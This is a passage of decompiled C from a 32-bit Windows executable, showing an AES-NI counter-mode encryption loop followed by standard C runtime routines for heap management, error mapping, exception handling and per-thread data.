  __m128i v136; // xmm5
  __m128i v137; // xmm6
  __m128i v168; // [esp+0h] [ebp-70h] BYREF
  __m128i v169; // [esp+10h] [ebp-60h] BYREF
  __m128i v170; // [esp+20h] [ebp-50h] BYREF
  __m128i v171; // [esp+30h] [ebp-40h] BYREF
  __m128i v172; // [esp+40h] [ebp-30h] BYREF
  __m128i v173; // [esp+50h] [ebp-20h] BYREF
  __m128i v174; // [esp+60h] [ebp-10h] BYREF

  v9 = (const __m128i *)(*(_DWORD *)(a1 + 4) + 44);
  v10 = _byteswap_ulong(*(_DWORD *)(a1 + 20));
  v168 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)(a1 + 8)), _mm_loadu_si128(v9));
  v169 = v168;
  v170 = v168;
  v171 = v168;
  v172 = v168;
  v173 = v168;
  v174 = v168;
  v169.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v10);
  v170.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v10);
  v171.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v10);
  v172.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v10);
  v173.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v10);
  v11 = v10 + 1;
  v174.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(v11);
  while ( a6 >= 0x70 )
  {
    _XMM0 = _mm_loadu_si128(&v168);
    _XMM1 = _mm_loadu_si128(&v169);
    _XMM2 = _mm_loadu_si128(&v170);
    _XMM3 = _mm_loadu_si128(&v171);
    _XMM4 = _mm_loadu_si128(&v172);
    _XMM5 = _mm_loadu_si128(&v173);
    _XMM6 = _mm_loadu_si128(&v174);
    _XMM7 = _mm_loadu_si128(v9 + 1);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v27 = v11 + 1;
    v168.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(v27);
    _XMM7 = _mm_loadu_si128(v9 + 2);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v169.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v27);
    _XMM7 = _mm_loadu_si128(v9 + 3);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v170.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v27);
    _XMM7 = _mm_loadu_si128(v9 + 4);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v171.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v27);
    _XMM7 = _mm_loadu_si128(v9 + 5);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v172.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v27);
    _XMM7 = _mm_loadu_si128(v9 + 6);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v173.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v27);
    _XMM7 = _mm_loadu_si128(v9 + 7);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v11 = v27 + 1;
    v174.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(v11);
    _XMM7 = _mm_loadu_si128(v9 + 8);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    _XMM7 = _mm_loadu_si128(v9 + 9);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    _XMM7 = _mm_loadu_si128(v9 + 10);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    _XMM7 = _mm_loadu_si128(v9 + 11);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    _XMM7 = _mm_loadu_si128(v9 + 12);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    _XMM7 = _mm_loadu_si128(v9 + 13);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    _XMM7 = _mm_loadu_si128(v9 + 14);
    __asm
    {
      aesenclast xmm0, xmm7
      aesenclast xmm1, xmm7
      aesenclast xmm2, xmm7
      aesenclast xmm3, xmm7
      aesenclast xmm4, xmm7
      aesenclast xmm5, xmm7
      aesenclast xmm6, xmm7
    }
    v132 = _mm_xor_si128(_XMM1, _mm_loadu_si128(a5 + 1));
    v133 = _mm_xor_si128(_XMM2, _mm_loadu_si128(a5 + 2));
    v134 = _mm_xor_si128(_XMM3, _mm_loadu_si128(a5 + 3));
    v135 = _mm_xor_si128(_XMM4, _mm_loadu_si128(a5 + 4));
    v136 = _mm_xor_si128(_XMM5, _mm_loadu_si128(a5 + 5));
    v137 = _mm_xor_si128(_XMM6, _mm_loadu_si128(a5 + 6));
    *a2 = _mm_xor_si128(_XMM0, _mm_loadu_si128(a5));
    a2[1] = v132;
    a2[2] = v133;
    a2[3] = v134;
    a2[4] = v135;
    a2[5] = v136;
    a2[6] = v137;
    a5 += 7;
    a2 += 7;
    a6 -= 112;
  }
  while ( a6 >= 0x10 )
  {
    _XMM0 = _mm_loadu_si128(&v168);
    _XMM7 = _mm_loadu_si128(v9 + 1);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 2);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 3);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 4);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 5);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 6);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 7);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 8);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 9);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 10);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 11);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 12);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 13);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 14);
    __asm { aesenclast xmm0, xmm7 }
    *a2++ = _mm_xor_si128(_XMM0, _mm_loadu_si128(a5++));
    a6 -= 16;
  }
  *(__m128i *)(a1 + 8) = _mm_xor_si128(_mm_loadu_si128(&v168), _mm_loadu_si128(v9));
  return 0;
}

//----- (00413818) --------------------------------------------------------
void __usercall sub_413818(int a1@<edi>, int a2@<esi>, int a3, int a4, int a5)
{
  int v5; // ecx
  int v6; // edx
  unsigned int v7; // kr00_4
  BOOL v8; // edi
  struct _EXCEPTION_POINTERS ExceptionInfo; // [esp+8h] [ebp-328h] BYREF
  int v10; // [esp+10h] [ebp-320h] BYREF
  int v11[19]; // [esp+14h] [ebp-31Ch] BYREF
  int v12[35]; // [esp+60h] [ebp-2D0h] BYREF
  __int16 v13; // [esp+ECh] [ebp-244h]
  __int16 v14; // [esp+F0h] [ebp-240h]
  __int16 v15; // [esp+F4h] [ebp-23Ch]
  __int16 v16; // [esp+F8h] [ebp-238h]
  int v17; // [esp+FCh] [ebp-234h]
  int v18; // [esp+100h] [ebp-230h]
  int v19; // [esp+104h] [ebp-22Ch]
  int v20; // [esp+108h] [ebp-228h]
  int v21; // [esp+10Ch] [ebp-224h]
  int *v22; // [esp+110h] [ebp-220h]
  int v23; // [esp+114h] [ebp-21Ch]
  int v24; // [esp+118h] [ebp-218h]
  __int16 v25; // [esp+11Ch] [ebp-214h]
  unsigned int v26; // [esp+120h] [ebp-210h]
  int *v27; // [esp+124h] [ebp-20Ch]
  __int16 v28; // [esp+128h] [ebp-208h]
  int savedregs; // [esp+330h] [ebp+0h]
  int retaddr; // [esp+334h] [ebp+4h] BYREF

  if ( a3 != -1 )
    sub_413E8F();
  sub_413EB0((int)v11, 0, 0x4Cu);
  ExceptionInfo.ExceptionRecord = (PEXCEPTION_RECORD)&v10;
  ExceptionInfo.ContextRecord = (PCONTEXT)v12;
  v22 = v12;
  v21 = v5;
  v20 = v6;
  v19 = a3;
  v18 = a2;
  v17 = a1;
  v28 = __SS__;
  v25 = __CS__;
  v16 = __DS__;
  v15 = __ES__;
  v14 = __FS__;
  v13 = __GS__;
  v7 = __readeflags();
  v26 = v7;
  v27 = &retaddr;
  v12[0] = 65537;
  v24 = retaddr;
  v23 = savedregs;
  v10 = a4;
  v11[0] = a5;
  v11[2] = retaddr;
  v8 = IsDebuggerPresent();
  SetUnhandledExceptionFilter(0);
  if ( !UnhandledExceptionFilter(&ExceptionInfo) && !v8 && a3 != -1 )
    sub_413E8F();
}
// 413876: variable 'v5' is possibly undefined
// 41387C: variable 'v6' is possibly undefined

//----- (00413941) --------------------------------------------------------
BOOL __usercall sub_413941@<eax>(int a1@<edi>)
{
  HANDLE CurrentProcess; // eax

  sub_413818(a1, -1073740777, 2, -1073740777, 1);
  CurrentProcess = GetCurrentProcess();
  return TerminateProcess(CurrentProcess, 0xC0000417);
}

//----- (00413966) --------------------------------------------------------
int __usercall sub_413966@<eax>(int a1@<edi>, int a2, int a3, int a4, int a5, int a6)
{
  int (*v6)(void); // eax

  v6 = (int (*)(void))DecodePointer(Ptr);
  if ( !v6 )
  {
    sub_413941(a1);
    __debugbreak();
  }
  return v6();
}

//----- (00413993) --------------------------------------------------------
int __usercall sub_413993@<eax>(int a1@<edi>)
{
  return sub_413966(a1, 0, 0, 0, 0, 0);
}

//----- (004139A3) --------------------------------------------------------
void __cdecl sub_4139A3(LPVOID lpMem)
{
  DWORD *v1; // esi
  int LastError; // eax

  if ( lpMem )
  {
    if ( !HeapFree(hHeap, 0, lpMem) )
    {
      v1 = sub_413A1F();
      LastError = GetLastError();
      *v1 = sub_4139DD(LastError);
    }
  }
}

//----- (004139DD) --------------------------------------------------------
int __cdecl sub_4139DD(int a1)
{
  unsigned int i; // ecx

  for ( i = 0; i < 0x2D; ++i )
  {
    if ( a1 == dword_423060[2 * i] )
      return dword_423064[2 * i];
  }
  if ( (unsigned int)(a1 - 19) > 0x11 )
    return (unsigned int)(a1 - 188) > 0xE ? 22 : 8;
  else
    return 13;
}
// 423060: using guessed type int dword_423060[];
// 423064: using guessed type int dword_423064[89];

//----- (00413A1F) --------------------------------------------------------
DWORD *sub_413A1F()
{
  DWORD *v0; // eax

  v0 = sub_41413D();
  if ( v0 )
    return v0 + 2;
  else
    return (DWORD *)&unk_4231C8;
}

//----- (00413A32) --------------------------------------------------------
DWORD *sub_413A32()
{
  DWORD *v0; // eax

  v0 = sub_41413D();
  if ( v0 )
    return v0 + 3;
  else
    return (DWORD *)&unk_4231CC;
}

//----- (00413A45) --------------------------------------------------------
DWORD *__cdecl sub_413A45(DWORD a1)
{
  int v1; // esi
  DWORD *result; // eax

  *sub_413A32() = a1;
  v1 = sub_4139DD(a1);
  result = sub_413A1F();
  *result = v1;
  return result;
}

//----- (00413A68) --------------------------------------------------------
int sub_413A68()
{
  unsigned int v0; // eax
  char *v1; // eax
  int v3; // edx
  void **v4; // ecx
  int v5; // edx
  _DWORD *v6; // ecx
  int v7; // eax

  v0 = dword_42AF20;
  if ( !dword_42AF20 )
  {
    v0 = 512;
LABEL_5:
    dword_42AF20 = v0;
    goto LABEL_6;
  }
  if ( dword_42AF20 < 20 )
  {
    v0 = 20;
    goto LABEL_5;
  }
LABEL_6:
  v1 = (char *)sub_414000(v0, 4u);
  lpMem = v1;
  if ( !v1 )
  {
    dword_42AF20 = 20;
    v1 = (char *)sub_414000(0x14u, 4u);
    lpMem = v1;
    if ( !v1 )
      return 26;
  }
  v3 = 0;
  v4 = &off_4231D0;
  while ( 1 )
  {
    *(_DWORD *)&v1[v3] = v4;
    v4 += 8;
    v3 += 4;
    if ( (int)v4 >= (int)&off_423450 )
      break;
    v1 = (char *)lpMem;
  }
  v5 = 0;
  v6 = &unk_4231E0;
  do
  {
    v7 = *(_DWORD *)(((v5 & 0x1F) << 6) + dword_429E00[v5 >> 5]);
    if ( v7 == -1 || v7 == -2 || !v7 )
      *v6 = -2;
    v6 += 8;
    ++v5;
  }
  while ( (int)v6 < (int)&unk_423240 );
  return 0;
}
// 4231D0: using guessed type void *off_4231D0;
// 423450: using guessed type char *off_423450;
// 429E00: using guessed type int dword_429E00[];
// 42AF20: using guessed type int dword_42AF20;

//----- (00413B19) --------------------------------------------------------
void __usercall sub_413B19(int a1@<edi>)
{
  sub_4146F9();
  if ( byte_4252F4 )
    sub_4144D3(a1);
  sub_4139A3(lpMem);
}
// 4252F4: using guessed type char byte_4252F4;

//----- (00413B39) --------------------------------------------------------
void __usercall sub_413B39(int a1@<edi>, unsigned int a2)
{
  if ( a2 < (unsigned int)&off_4231D0 || a2 > (unsigned int)&unk_423430 )
  {
    EnterCriticalSection((LPCRITICAL_SECTION)(a2 + 32));
  }
  else
  {
    sub_4144A0(a1, ((int)(a2 - (_DWORD)&off_4231D0) >> 5) + 16);
    *(_DWORD *)(a2 + 12) |= 0x8000u;
  }
}
// 4231D0: using guessed type void *off_4231D0;

//----- (00413B7A) --------------------------------------------------------
void __usercall sub_413B7A(int a1@<edi>, int a2, int a3)
{
  if ( a2 >= 20 )
  {
    EnterCriticalSection((LPCRITICAL_SECTION)(a3 + 32));
  }
  else
  {
    sub_4144A0(a1, a2 + 16);
    *(_DWORD *)(a3 + 12) |= 0x8000u;
  }
}

//----- (00413BAC) --------------------------------------------------------
void __cdecl sub_413BAC(unsigned int a1)
{
  if ( a1 < (unsigned int)&off_4231D0 || a1 > (unsigned int)&unk_423430 )
  {
    LeaveCriticalSection((LPCRITICAL_SECTION)(a1 + 32));
  }
  else
  {
    *(_DWORD *)(a1 + 12) &= ~0x8000u;
    sub_4143C7(((int)(a1 - (_DWORD)&off_4231D0) >> 5) + 16);
  }
}
// 4231D0: using guessed type void *off_4231D0;

//----- (00413BE8) --------------------------------------------------------
void __cdecl sub_413BE8(int a1, int a2)
{
  if ( a1 >= 20 )
  {
    LeaveCriticalSection((LPCRITICAL_SECTION)(a2 + 32));
  }
  else
  {
    *(_DWORD *)(a2 + 12) &= ~0x8000u;
    sub_4143C7(a1 + 16);
  }
}

//----- (00413C17) --------------------------------------------------------
int __userpurge sub_413C17@<eax>(int a1@<ecx>, int a2@<edi>, _DWORD *a3)
{
  DWORD *v4; // eax
  int v5; // eax

  *(_BYTE *)(a1 + 12) = 0;
  if ( a3 )
  {
    *(_DWORD *)a1 = *a3;
    *(_DWORD *)(a1 + 4) = a3[1];
  }
  else
  {
    v4 = sub_4141B6(a2);
    *(_DWORD *)(a1 + 8) = v4;
    *(_DWORD *)a1 = v4[27];
    *(_DWORD *)(a1 + 4) = v4[26];
    if ( *(volatile LONG **)a1 != off_423D48 && (dword_423B00 & v4[28]) == 0 )
      *(_DWORD *)a1 = sub_415122(a2);
    if ( *(volatile LONG **)(a1 + 4) != lpAddend && (dword_423B00 & *(_DWORD *)(*(_DWORD *)(a1 + 8) + 112)) == 0 )
      *(_DWORD *)(a1 + 4) = sub_4149A1(a2);
    v5 = *(_DWORD *)(a1 + 8);
    if ( (*(_BYTE *)(v5 + 112) & 2) == 0 )
    {
      *(_DWORD *)(v5 + 112) |= 2u;
      *(_BYTE *)(a1 + 12) = 1;
    }
  }
  return a1;
}
// 423B00: using guessed type int dword_423B00;

//----- (00413D00) --------------------------------------------------------
int __usercall SEH_415480@<eax>(int a1@<edx>, PEXCEPTION_RECORD ExceptionRecord, char *TargetFrame, int a4)
{
  unsigned int v4; // ebx
  int *v5; // esi
  int v6; // eax
  char *v7; // edi
  int *v8; // edx
  int (*v9)(void); // ecx
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v14; // edx
  char *v15; // eax
  int v16; // eax
  char v17; // [esp+0h] [ebp-24h]
  char v18; // [esp+0h] [ebp-24h]
  int v19[2]; // [esp+Ch] [ebp-18h] BYREF
  int *v20; // [esp+14h] [ebp-10h]
  int v21; // [esp+18h] [ebp-Ch]
  int v22; // [esp+1Ch] [ebp-8h]
  char v23; // [esp+23h] [ebp-1h]

  v4 = (unsigned int)TargetFrame;
  v5 = (int *)(dword_423460 ^ *((_DWORD *)TargetFrame + 2));
  v6 = *v5;
  v23 = 0;
  v21 = 1;
  v7 = TargetFrame + 16;
  if ( v6 != -2 )
    sub_413E97(v6, a1, *(_DWORD *)&v7[v6] ^ (unsigned int)&v7[v5[1]], (int)TargetFrame, (int)v7, (int)v5, v17);
  sub_413E97(v5[2], a1, *(_DWORD *)&v7[v5[2]] ^ (unsigned int)&v7[v5[3]], (int)TargetFrame, (int)v7, (int)v5, v17);
  if ( (ExceptionRecord->ExceptionFlags & 0x66) != 0 )
  {
LABEL_25:
    if ( *(_DWORD *)(v4 + 12) == -2 )
      return v21;
    sub_4153CB(v4, 0xFFFFFFFE, (int)v7, &dword_423460);
  }
  else
  {
    v8 = v19;
    *((_DWORD *)TargetFrame - 1) = v19;
    v4 = *((_DWORD *)TargetFrame + 3);
    v19[0] = (int)ExceptionRecord;
    v19[1] = a4;
    if ( v4 == -2 )
      return v21;
    do
    {
      v9 = (int (*)(void))v5[3 * v4 + 5];
      v20 = &v5[3 * v4 + 4];
      v10 = *v20;
      v22 = *v20;
      if ( v9 )
      {
        v11 = sub_415382(v9);
        v23 = 1;
        if ( v11 < 0 )
        {
          v21 = 0;
          goto LABEL_11;
        }
        if ( v11 > 0 )
        {
          if ( ExceptionRecord->ExceptionCode == -529697949 && dword_429F10 && sub_415480((int)&dword_429F10) )
            dword_429F10(ExceptionRecord, 1);
          sub_4153B2(TargetFrame, ExceptionRecord);
          v15 = TargetFrame;
          if ( *((_DWORD *)TargetFrame + 3) != v4 )
          {
            sub_4153CB((int)TargetFrame, v4, (int)v7, &dword_423460);
            v15 = TargetFrame;
          }
          *((_DWORD *)v15 + 3) = v22;
          v16 = *v5;
          if ( *v5 != -2 )
            v16 = sub_413E97(v16, v14, *(_DWORD *)&v7[v16] ^ (unsigned int)&v7[v5[1]], v4, (int)v7, (int)v5, v18);
          sub_413E97(v16, v5[2], *(_DWORD *)&v7[v5[2]] ^ (unsigned int)&v7[v5[3]], v4, (int)v7, (int)v5, v18);
          sub_415399((int (__fastcall *)(_DWORD, _DWORD))v20[2], (int)v7);
          goto LABEL_25;
        }
        v10 = v22;
      }
      v4 = v10;
    }
    while ( v10 != -2 );
    if ( !v23 )
      return v21;
  }
LABEL_11:
  v12 = *v5;
  if ( *v5 != -2 )
    v12 = sub_413E97(v12, (int)v8, *(_DWORD *)&v7[v12] ^ (unsigned int)&v7[v5[1]], v4, (int)v7, (int)v5, v18);
  sub_413E97(v12, v5[2], *(_DWORD *)&v7[v5[2]] ^ (unsigned int)&v7[v5[3]], v4, (int)v7, (int)v5, v18);
  return v21;
}
// 413D34: variable 'v17' is possibly undefined
// 413D44: variable 'a1' is possibly undefined
// 413DB7: variable 'v8' is possibly undefined
// 413DB7: variable 'v18' is possibly undefined
// 413E4D: variable 'v14' is possibly undefined
// 423460: using guessed type int dword_423460;
// 429F10: using guessed type int (__cdecl *dword_429F10)(_DWORD, _DWORD);

//----- (00413E8F) --------------------------------------------------------
void sub_413E8F()
{
  dword_429F0C = 0;
}
// 429F0C: using guessed type int dword_429F0C;

//----- (00413E97) --------------------------------------------------------
int __usercall sub_413E97@<eax>(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<edi>,
        int a6@<esi>,
        char a7)
{
  if ( a3 != dword_423460 )
    return sub_41553C(a1, a2, a3, a4, a5, a6, a7);
  return a1;
}
// 423460: using guessed type int dword_423460;

//----- (00413EB0) --------------------------------------------------------
int __cdecl sub_413EB0(int a1, unsigned __int8 a2, unsigned int a3)
{
  unsigned int v3; // edx
  _BYTE *v4; // ecx
  int v5; // eax
  unsigned __int8 *v6; // edi
  int v7; // ecx
  unsigned int v8; // ecx
  unsigned int v9; // ecx
  int v11; // eax
  unsigned int v12; // eax
  unsigned int v13; // edx
  unsigned int j; // eax
  unsigned int k; // eax
  unsigned int v16; // edx
  char v17; // al
  unsigned int m; // edx
  int n; // eax
  int v20; // edx
  unsigned int i; // ebx

  v3 = a3;
  v4 = (_BYTE *)a1;
  if ( !a3 )
    return a1;
  LOBYTE(v5) = a2;
  if ( !a2 && a3 >= 0x80 && dword_429DF4 )
  {
    v11 = a1 & 0xF;
    if ( (a1 & 0xF) != 0 )
    {
      v20 = (16 - (_BYTE)v11) & 3;
      if ( ((16 - (_BYTE)v11) & 3) != 0 )
      {
        do
        {
          *v4++ = 0;
          --v20;
        }
        while ( v20 );
      }
      for ( i = (unsigned int)(16 - v11) >> 2; i; --i )
      {
        *(_DWORD *)v4 = 0;
        v4 += 4;
      }
      v3 = a3 - (16 - v11);
    }
    v12 = v3;
    v13 = v3 & 0x7F;
    for ( j = v12 >> 7; j; --j )
    {
      *(_OWORD *)v4 = 0i64;
      *((_OWORD *)v4 + 1) = 0i64;
      *((_OWORD *)v4 + 2) = 0i64;
      *((_OWORD *)v4 + 3) = 0i64;
      *((_OWORD *)v4 + 4) = 0i64;
      *((_OWORD *)v4 + 5) = 0i64;
      *((_OWORD *)v4 + 6) = 0i64;
      *((_OWORD *)v4 + 7) = 0i64;
      v4 += 128;
    }
    if ( v13 )
    {
      for ( k = v13 >> 4; k; --k )
      {
        *(_OWORD *)v4 = 0i64;
        v4 += 16;
      }
      v16 = v13 & 0xF;
      if ( v16 )
      {
        v17 = v16;
        for ( m = v16 >> 2; m; --m )
        {
          *(_DWORD *)v4 = 0;
          v4 += 4;
        }
        for ( n = v17 & 3; n; --n )
          *v4++ = 0;
      }
    }
    return a1;
  }
  else
  {
    v6 = (unsigned __int8 *)a1;
    if ( a3 < 4 )
      goto LABEL_33;
    v7 = -a1 & 3;
    if ( v7 )
    {
      v3 = a3 - v7;
      do
      {
        *v6++ = a2;
        --v7;
      }
      while ( v7 );
    }
    v5 = 16843009 * a2;
    v8 = v3;
    v3 &= 3u;
    v9 = v8 >> 2;
    if ( !v9 || (memset32(v6, v5, v9), v6 += 4 * v9, v3) )
    {
LABEL_33:
      do
      {
        *v6++ = v5;
        --v3;
      }
      while ( v3 );
    }
    return a1;
  }
}
// 429DF4: using guessed type int dword_429DF4;

//----- (00413F30) --------------------------------------------------------
char *__cdecl sub_413F30(_DWORD *a1)
{
  _DWORD *v1; // ecx
  char v2; // al
  int v3; // eax
  int v4; // eax

  v1 = a1;
  if ( ((unsigned __int8)a1 & 3) == 0 )
    goto LABEL_4;
  do
  {
    v2 = *(_BYTE *)v1;
    v1 = (_DWORD *)((char *)v1 + 1);
    if ( !v2 )
      return (char *)((char *)v1 - 1 - (char *)a1);
  }
  while ( ((unsigned __int8)v1 & 3) != 0 );
  while ( 1 )
  {
    do
    {
LABEL_4:
      v3 = (*v1 + 2130640639) ^ ~*v1;
      ++v1;
    }
    while ( (v3 & 0x81010100) == 0 );
    v4 = *(v1 - 1);
    if ( !(_BYTE)v4 )
      break;
    if ( !BYTE1(v4) )
      return (char *)((char *)v1 - 3 - (char *)a1);
    if ( (v4 & 0xFF0000) == 0 )
      return (char *)((char *)v1 - 2 - (char *)a1);
    if ( (v4 & 0xFF000000) == 0 )
      return (char *)((char *)v1 - 1 - (char *)a1);
  }
  return (char *)((char *)(v1 - 1) - (char *)a1);
}

//----- (00413FBB) --------------------------------------------------------
void *__usercall sub_413FBB@<eax>(void *a1@<edi>, SIZE_T dwBytes)
{
  DWORD v2; // esi
  int v3; // eax

  v2 = 0;
  do
  {
    a1 = sub_41573D(a1, dwBytes);
    if ( a1 || !dword_4252B8 )
      break;
    Sleep(v2);
    v3 = v2 + 1000;
    if ( v2 + 1000 > dword_4252B8 )
      v3 = -1;
    v2 = v3;
  }
  while ( v3 != -1 );
  return a1;
}
// 4252B8: using guessed type int dword_4252B8;

//----- (00414000) --------------------------------------------------------
LPVOID __cdecl sub_414000(unsigned int a1, unsigned int a2)
{
  DWORD v2; // esi
  LPVOID v3; // edi
  int v4; // eax

  v2 = 0;
  do
  {
    v3 = sub_4157D1(a1, a2, 0);
    if ( v3 || !dword_4252B8 )
      break;
    Sleep(v2);
    v4 = v2 + 1000;
    if ( v2 + 1000 > dword_4252B8 )
      v4 = -1;
    v2 = v4;
  }
  while ( v4 != -1 );
  return v3;
}
// 4252B8: using guessed type int dword_4252B8;

//----- (0041404C) --------------------------------------------------------
PVOID sub_41404C()
{
  return EncodePointer(0);
}

//----- (00414055) --------------------------------------------------------
void *sub_414055()
{
  void *Value; // esi

  Value = TlsGetValue(dwTlsIndex);
  if ( !Value )
  {
    Value = DecodePointer(dword_4252C0);
    TlsSetValue(dwTlsIndex, Value);
  }
  return Value;
}

//----- (00414089) --------------------------------------------------------
void __cdecl sub_414089(int a1, int a2)
{
  int savedregs; // [esp+28h] [ebp+0h]

  GetModuleHandleW(L"KERNEL32.DLL");
  *(_DWORD *)(a1 + 92) = &unk_419790;
  *(_DWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 20) = 1;
  *(_DWORD *)(a1 + 112) = 1;
  *(_BYTE *)(a1 + 200) = 67;
  *(_BYTE *)(a1 + 331) = 67;
  *(_DWORD *)(a1 + 104) = &unk_4235E0;
  sub_4144A0(1, 13);
  InterlockedIncrement(*(volatile LONG **)(a1 + 104));
  sub_4143C7(13);
  sub_4144A0(1, 12);
  *(_DWORD *)(a1 + 108) = a2;
  if ( !a2 )
    *(_DWORD *)(a1 + 108) = off_423D48;
  sub_414E62(*(volatile LONG **)(a1 + 108));
  savedregs = 4276511;
  sub_4143C7(12);
}

//----- (0041413D) --------------------------------------------------------
DWORD *sub_41413D()
{
  DWORD LastError; // eax
  DWORD v1; // edi
  int (__stdcall *v2)(int); // eax
  DWORD *v3; // esi
  DWORD *v4; // eax
  int (__stdcall *v5)(int, DWORD *); // eax
  DWORD CurrentThreadId; // eax
  int v8; // [esp-8h] [ebp-10h]
  int v9; // [esp-4h] [ebp-Ch]
  DWORD *v10; // [esp-4h] [ebp-Ch]

  LastError = GetLastError();
  v9 = dword_423474;
  v1 = LastError;
  v2 = (int (__stdcall *)(int))sub_414055();
  v3 = (DWORD *)v2(v9);
  if ( !v3 )
  {
    v4 = (DWORD *)sub_414000(1u, 0x214u);
    v3 = v4;
    if ( v4 )
    {
      v10 = v4;
      v8 = dword_423474;
      v5 = (int (__stdcall *)(int, DWORD *))DecodePointer(dword_4252C4);
      if ( v5(v8, v10) )
      {
        sub_414089((int)v3, 0);
        CurrentThreadId = GetCurrentThreadId();
        v3[1] = -1;
        *v3 = CurrentThreadId;
      }
      else
      {
        sub_4139A3(v3);
        v3 = 0;
      }
    }
  }
  SetLastError(v1);
  return v3;
}
// 423474: using guessed type int dword_423474;

//----- (004141B6) --------------------------------------------------------
DWORD *__usercall sub_4141B6@<eax>(int a1@<edi>)
{
  DWORD *result; // eax

  result = sub_41413D();
  if ( !result )
    sub_414369(a1, 16);
  return result;
}

//----- (004141D0) --------------------------------------------------------
HMODULE __cdecl sub_4141D0(int a1)
{
  HMODULE result; // eax

  result = GetModuleHandleW(L"mscoree.dll");
  if ( result )
  {
    result = (HMODULE)GetProcAddress(result, "CorExitProcess");
    if ( result )
